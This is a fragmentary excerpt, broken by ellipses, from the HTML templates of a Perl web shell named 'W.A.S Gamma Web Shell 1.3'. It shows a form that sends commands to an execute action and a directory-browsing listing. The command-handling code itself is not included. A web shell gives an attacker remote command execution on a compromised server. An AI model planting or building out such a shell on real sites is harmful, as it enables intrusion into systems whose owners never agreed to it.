...
my $VERSION = 'W.A.S Gamma Web Shell 1.3';
...
<form action="was.was" method="POST">
<table class="box">
...
<tr><td class="footer"><h5> o--{ W.A.S Shell }--o</h5></td></tr>
</table>
</body>
</html>
EOT
...
<tr>
<td width="100%" height="100%" align="center" valign="center">
<iframe name="output" src="was.was?action=execute" width="80%" height="80%"></iframe>
<br><br>
...
<form name="execute" action="was.was" method="POST" target="output">
...
<th colspan="6">
[% for entry in directory %]<code class="entry-dir"><a href="was.was?action=browse&path=[% entry.path as url %]">[% entry.name as html %]/</a></code>[% end %]
</th>
</tr>
...
[% end %]
[% elif entry.type_dir %]
<code class="entry-dir"><a href="was.was?action=browse&path=[% entry.name as url %]">[% entry.name as html %]/</a></code>
[% else %]
